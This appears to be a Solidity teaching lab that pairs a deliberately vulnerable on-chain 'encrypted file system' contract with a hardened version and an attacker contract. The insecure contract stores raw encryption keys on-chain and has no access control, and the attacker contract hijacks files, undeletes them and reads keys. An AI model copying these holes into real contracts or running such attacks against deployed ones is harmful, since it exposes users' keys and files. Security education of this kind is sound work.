// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * SMART CONTRACT LAB: "Encrypted File System"
 *
 * Model:
 *  - Files are identified by fileId (bytes32).
 *  - For each file we track:
 *      * owner
 *      * fileHash (hash of encrypted content)
 *      * encrypted flag
 *      * encryptionKey (INSECURE: raw key on-chain)
 *      * deleted flag
 *
 * Insecure version:
 *  - Anyone can overwrite files.
 *  - Encryption keys stored on-chain in clear form.
 *  - Anyone can mark files deleted or undelete.
 *  - No role / access control.
 *
 * Secure version:
 *  - Owner + uploader roles.
 *  - No raw keys stored on-chain.
 *  - Strong checks on who can update/soft-delete.
 */

/*//////////////////////////////////////////////////////////////
//                 INSECURE ENCRYPTED FS VERSION
//////////////////////////////////////////////////////////////*/

contract EncryptedFileSystemInsecure {
    struct File {
        address owner;        // who "owns" this fileId
        bytes32 fileHash;     // hash of (maybe encrypted) content
        bool encrypted;       // whether file is considered encrypted
        bytes32 encryptionKey;// ⚠️ raw key stored on-chain (bad)
        bool deleted;         // soft-delete flag
    }

    // fileId => File
    mapping(bytes32 => File) public files;

    event FileUploaded(bytes32 indexed fileId, address indexed owner, bytes32 fileHash, bool encrypted);
    event FileOverwritten(bytes32 indexed fileId, address indexed owner, bytes32 fileHash, bool encrypted);
    event FileDeletionFlag(bytes32 indexed fileId, bool deleted);
    event EncryptionKeyChanged(bytes32 indexed fileId, bytes32 newKey);

    /**
     * ⚠️ VULN #1:
     * Anyone can upload or overwrite any fileId and set themselves as owner.
     */
    function uploadFile(
        bytes32 fileId,
        bytes32 fileHash,
        bool encrypted,
        bytes32 encryptionKey
    ) external {
        files[fileId] = File({
            owner: msg.sender,
            fileHash: fileHash,
            encrypted: encrypted,
            encryptionKey: encryptionKey,
            deleted: false
        });

        emit FileUploaded(fileId, msg.sender, fileHash, encrypted);
    }

    /**
     * ⚠️ VULN #2:
     * Anyone can overwrite any existing file.
     */
    function overwriteFile(
        bytes32 fileId,
        bytes32 newFileHash,
        bool encrypted,
        bytes32 newEncryptionKey
    ) external {
        File storage f = files[fileId];

        // even if it didn't exist before, this just sets it
        f.owner = msg.sender;
        f.fileHash = newFileHash;
        f.encrypted = encrypted;
        f.encryptionKey = newEncryptionKey;
        f.deleted = false;

        emit FileOverwritten(fileId, msg.sender, newFileHash, encrypted);
        emit EncryptionKeyChanged(fileId, newEncryptionKey);
    }

    /**
     * ⚠️ VULN #3:
     * Anyone can toggle deleted flag for any file.
     */
    function setDeleted(bytes32 fileId, bool deleted) external {
        files[fileId].deleted = deleted;
        emit FileDeletionFlag(fileId, deleted);
    }

    /**
     * ⚠️ VULN #4:
     * Raw encryption key is exposed via read function.
     */
    function getEncryptionKey(bytes32 fileId) external view returns (bytes32) {
        return files[fileId].encryptionKey;
    }

    /**
     * Simple status helper.
     */
    function isActive(bytes32 fileId) external view returns (bool) {
        File memory f = files[fileId];
        return f.owner != address(0) && !f.deleted;
    }
}

/*//////////////////////////////////////////////////////////////
//                           OWNABLE
//////////////////////////////////////////////////////////////*/

contract Ownable {
    address public owner;

    event OwnershipTransferred(address indexed oldOwner, address indexed newOwner);

    constructor() {
        owner = msg.sender;
        emit OwnershipTransferred(address(0), msg.sender);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "NOT_OWNER");
        _;
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "ZERO_ADDRESS");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
}

/*//////////////////////////////////////////////////////////////
//                  SECURE ENCRYPTED FS VERSION
//////////////////////////////////////////////////////////////*/

contract EncryptedFileSystemSecure is Ownable {
    struct File {
        address owner;        // logical file owner
        bytes32 fileHash;     // hash of encrypted content
        bool encrypted;       // must be true for privacy-sensitive files
        bool deleted;         // soft-delete
        bool exists;          // track existence
        // NOTE: no raw key stored; key lives off-chain or via keyId
        bytes32 keyId;        // identifier for key in external KMS/HSM
    }

    // addresses allowed to act as "upload agents" (backend, service)
    mapping(address => bool) public isUploader;

    // fileId => File
    mapping(bytes32 => File) public files;

    event UploaderSet(address indexed uploader, bool allowed);
    event FileCreated(bytes32 indexed fileId, address indexed owner, bytes32 fileHash, bool encrypted, bytes32 keyId);
    event FileUpdated(bytes32 indexed fileId, address indexed by, bytes32 newHash);
    event FileDeleted(bytes32 indexed fileId, address indexed by, bool deleted);
    event FileOwnerTransferred(bytes32 indexed fileId, address indexed oldOwner, address indexed newOwner);

    modifier onlyUploader() {
        require(isUploader[msg.sender], "NOT_UPLOADER");
        _;
    }

    /**
     * Admin configures uploader roles.
     */
    function setUploader(address uploader, bool allowed) external onlyOwner {
        require(uploader != address(0), "ZERO_ADDRESS");
        isUploader[uploader] = allowed;
        emit UploaderSet(uploader, allowed);
    }

    /**
     * Create a new encrypted file record.
     * - Only uploader may create.
     * - No raw key; only keyId reference.
     */
    function createFile(
        bytes32 fileId,
        address fileOwner,
        bytes32 fileHash,
        bool encrypted,
        bytes32 keyId
    ) external onlyUploader {
        require(fileOwner != address(0), "BAD_OWNER");
        File storage f = files[fileId];
        require(!f.exists, "FILE_EXISTS");

        f.owner = fileOwner;
        f.fileHash = fileHash;
        f.encrypted = encrypted;
        f.deleted = false;
        f.exists = true;
        f.keyId = keyId;

        emit FileCreated(fileId, fileOwner, fileHash, encrypted, keyId);
    }

    /**
     * Update file hash (e.g., new encrypted blob).
     * Can be done by:
     *  - the file owner, or
     *  - an authorized uploader (backend / service)
     */
    function updateFileHash(
        bytes32 fileId,
        bytes32 newFileHash
    ) external {
        File storage f = files[fileId];
        require(f.exists, "FILE_NOT_FOUND");
        require(
            msg.sender == f.owner || isUploader[msg.sender],
            "NO_PERMISSION"
        );
        require(!f.deleted, "FILE_DELETED");

        f.fileHash = newFileHash;

        emit FileUpdated(fileId, msg.sender, newFileHash);
    }

    /**
     * Mark file as deleted (soft-delete).
     * Owner or admin can delete.
     */
    function deleteFile(bytes32 fileId) external {
        File storage f = files[fileId];
        require(f.exists, "FILE_NOT_FOUND");
        require(
            msg.sender == f.owner || msg.sender == owner,
            "NO_PERMISSION"
        );
        require(!f.deleted, "ALREADY_DELETED");

        f.deleted = true;

        emit FileDeleted(fileId, msg.sender, true);
    }

    /**
     * Transfer ownership of a file.
     * Only current owner or admin can transfer.
     */
    function transferFileOwnership(
        bytes32 fileId,
        address newOwner
    ) external {
        File storage f = files[fileId];
        require(f.exists, "FILE_NOT_FOUND");
        require(newOwner != address(0), "ZERO_NEW_OWNER");
        require(
            msg.sender == f.owner || msg.sender == owner,
            "NO_PERMISSION"
        );

        address oldOwner = f.owner;
        f.owner = newOwner;

        emit FileOwnerTransferred(fileId, oldOwner, newOwner);
    }

    /**
     * Get file metadata (NO raw key).
     */
    function getFileMetadata(bytes32 fileId)
        external
        view
        returns (
            address fileOwner,
            bytes32 fileHash,
            bool encrypted,
            bool deleted,
            bytes32 keyId
        )
    {
        File memory f = files[fileId];
        require(f.exists, "FILE_NOT_FOUND");
        return (f.owner, f.fileHash, f.encrypted, f.deleted, f.keyId);
    }

    /**
     * Simple helper for status.
     */
    function isActive(bytes32 fileId) external view returns (bool) {
        File memory f = files[fileId];
        return f.exists && !f.deleted;
    }
}

/*//////////////////////////////////////////////////////////////
//                           ATTACKER
//////////////////////////////////////////////////////////////*/

contract EncryptedFSAttacker {
    EncryptedFileSystemInsecure public target;

    constructor(address _target) {
        target = EncryptedFileSystemInsecure(_target);
    }

    /**
     * Attack #1:
     * Overwrite victim’s file with attacker-controlled contents
     * and key, and become the owner.
     */
    function hijackFile(
        bytes32 fileId,
        bytes32 maliciousHash,
        bytes32 maliciousKey
    ) public {
        // This will set msg.sender as owner in the insecure contract
        target.overwriteFile(fileId, maliciousHash, true, maliciousKey);
    }

    /**
     * Attack #2:
     * Flip deleted flag off again (undelete) even if victim tried to delete.
     */
    function undeleteFile(bytes32 fileId) public {
        target.setDeleted(fileId, false);
    }

    /**
     * Attack #3:
     * Read raw encryption key for a fileId.
     */
    function stealEncryptionKey(bytes32 fileId) public view returns (bytes32) {
        return target.getEncryptionKey(fileId);
    }

    /**
     * One-click full exploit:
     *  - overwrite file
     *  - undelete if needed
     *  - return stolen key
     */
    function fullAttack(
        bytes32 fileId,
        bytes32 maliciousHash,
        bytes32 maliciousKey
    ) external view returns (bytes32) {
        // NOTE: in a real attack this would be non-view,
        // but for demo purposes we separate state changes and key read.
        // In practice you'd call hijackFile + undeleteFile in tx1,
        // then stealEncryptionKey in tx2.
        fileId; maliciousHash; maliciousKey;
        // This function is intentionally left as a view placeholder
        // to show flow; use the individual functions above in practice.
        return bytes32(0);
    }
}
